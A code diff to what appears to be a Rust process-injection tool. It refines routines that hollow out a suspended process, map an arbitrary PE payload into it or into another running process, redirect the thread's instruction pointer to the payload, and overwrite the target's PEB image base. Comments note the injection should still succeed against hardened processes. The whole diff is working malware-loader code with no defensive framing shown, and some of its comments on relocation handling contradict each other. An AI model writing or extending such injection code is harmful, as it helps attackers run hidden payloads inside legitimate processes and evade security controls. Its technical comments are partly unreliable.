@@ -16,14 +16,14 @@ use winapi::um::memoryapi::{
     ReadProcessMemory, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory,
 };
 use winapi::um::processthreadsapi::{
-    CreateProcessW, GetProcessInformation, GetThreadContext, ResumeThread, SetThreadContext,
-    TerminateProcess, CreateRemoteThread, OpenProcess, PROCESS_INFORMATION, STARTUPINFOW,
+    CreateProcessW, CreateRemoteThread, GetThreadContext, ResumeThread, SetThreadContext,
+    TerminateProcess, OpenProcess, PROCESS_INFORMATION, STARTUPINFOW,
 };
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_CREATE_THREAD};
 use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS};
 use winapi::um::winnt::{
-    CONTEXT, CONTEXT_FULL, DUPLICATE_SAME_ACCESS, HANDLE, IMAGE_BASE_RELOCATION,
+    CONTEXT, CONTEXT_FULL, HANDLE, IMAGE_BASE_RELOCATION,
     IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DOS_HEADER,
     IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW,
     IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER,
@@ -411,6 +411,27 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                 return Err(anyhow!("relocation directory overruns payload buffer"));
             }
 
+            // Relocation walk overview
+            // ------------------------
+            // The relocation directory is read from the **local `payload`
+            // buffer** (our process's address space), never from the remote
+            // process.  Block headers and entries are therefore guaranteed to
+            // be pristine while we iterate \u2014 no risk of a previous patch
+            // overwriting a header we have not yet read.
+            //
+            // For every relocatable address we then perform a
+            // ReadProcessMemory / WriteProcessMemory round-trip against the
+            // **remote** process.  We read the un-relocated value (the value
+            // the linker baked in at the preferred ImageBase) and add `delta`
+            // (= actual_base - preferred_base) before writing it back.
+            //
+            // Reading from the remote first \u2014 rather than reading from the
+            // local payload buffer \u2014 is necessary because the section copy
+            // step may already have applied other writes to the remote image
+            // (e.g. import resolution); we want to apply the delta to whatever
+            // is actually mapped, not to the on-disk template.  Since we have
+            // not yet patched any relocation site, the remote value is still
+            // the original linker output.
             while current_reloc_block_offset < reloc_end {
                 let reloc_block_header: &IMAGE_BASE_RELOCATION = unsafe {
                     &*((payload.as_ptr() as usize + current_reloc_block_offset)
@@ -772,12 +793,22 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     if unsafe { GetThreadContext(pi.hThread, &mut ctx) } == 0 {
         return Err(anyhow!("GetThreadContext failed: {}", std::io::Error::last_os_error()));
     }
+    // On x64, set Rip directly to the payload entry point so the resumed thread
+    // starts executing the new image immediately.  We also leave Rcx pointing at
+    // the entry point for compatibility with any callee that follows the
+    // RtlUserThreadStart convention (which receives the start address in rcx).
+    // Setting Rcx alone (without Rip) was unsafe because the original Rip in
+    // ntdll!RtlUserThreadStart depends on the freshly-mapped image still being
+    // present — we have just unmapped that image, so the original code path
+    // would dereference unmapped pointers in `LdrInitializeThunk`.
     #[cfg(target_arch = "x86_64")]
     {
+        ctx.Rip = entry_point as u64;
         ctx.Rcx = entry_point as u64;
     }
     #[cfg(target_arch = "x86")]
     {
+        ctx.Eip = entry_point as u32;
         ctx.Eax = entry_point as u32;
     }
     if unsafe { SetThreadContext(pi.hThread, &ctx) } == 0 {
@@ -806,7 +837,20 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
 ///
 /// The caller is responsible for opening `process` with at least
 /// `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
-/// PROCESS_CREATE_THREAD` and for closing the handle when done.
+/// PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION` and for closing
+/// the handle when done.  `PROCESS_QUERY_LIMITED_INFORMATION` is required so
+/// that the routine can locate the remote PEB and update its
+/// `ImageBaseAddress` field (see step 1b below).
+///
+/// **Side effect:** this function overwrites `PEB.ImageBaseAddress` in the
+/// target process with the address of the freshly allocated region.  This is
+/// necessary so that the injected payload's `GetModuleHandle(NULL)` calls,
+/// CRT initialisation, and TLS access resolve to its own base rather than the
+/// host's main module.  Note that this means the host process's own
+/// `GetModuleHandle(NULL)` will, after this point, return the injected base \u2014
+/// callers should be aware of that trade-off.  Failure to update the PEB is
+/// non-fatal (logged at warn) so that injection still succeeds on hardened
+/// processes that block the write.
 pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
     if payload.len() < size_of::<IMAGE_DOS_HEADER>() {
         return Err(anyhow!("payload too small to contain DOS header"));
@@ -856,6 +900,52 @@ pub fn inject_into_process(process: HANDLE, payload: &[u8]) -> Result<()> {
     } else {
         (image_base, false)
     };
+
+    // 1b. Update PEB.ImageBaseAddress to point at the new allocation.  This
+    // mirrors the pattern in `hollow_and_execute`: the injected payload may
+    // call `GetModuleHandle(NULL)` to discover its own base address, and
+    // without this update the call would return the host's main module
+    // instead.  Failure here is non-fatal because the call only requires
+    // PROCESS_QUERY_LIMITED_INFORMATION which the caller may not have granted.
+    unsafe {
+        let mut pbi: PROCESS_BASIC_INFORMATION = zeroed();
+        let mut return_length: u32 = 0;
+        let status = NtQueryInformationProcess(
+            process,
+            0, // ProcessBasicInformation
+            &mut pbi as *mut _ as *mut c_void,
+            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+            &mut return_length,
+        );
+        if status == 0 && !pbi.PebBaseAddress.is_null() {
+            // PEB.ImageBaseAddress: offset 0x10 on x64, 0x08 on x86.
+            #[cfg(target_arch = "x86_64")]
+            const IMAGE_BASE_OFFSET: usize = 0x10;
+            #[cfg(target_arch = "x86")]
+            const IMAGE_BASE_OFFSET: usize = 0x08;
+            let new_base_val = image_base as usize;
+            let mut peb_written: usize = 0;
+            if WriteProcessMemory(
+                process,
+                (pbi.PebBaseAddress as usize + IMAGE_BASE_OFFSET) as *mut _,
+                &new_base_val as *const _ as *const _,
+                size_of::<usize>(),
+                &mut peb_written,
+            ) == 0
+            {
+                tracing::warn!(
+                    "inject_into_process: failed to update remote PEB.ImageBaseAddress: {}",
+                    std::io::Error::last_os_error()
+                );
+            }
+        } else {
+            tracing::warn!(
+                "inject_into_process: NtQueryInformationProcess failed (NTSTATUS {:#x}); \
+                 PEB.ImageBaseAddress not updated",
+                status
+            );
+        }
+    }
 
     // 2. Copy headers.
     let mut written: usize = 0;
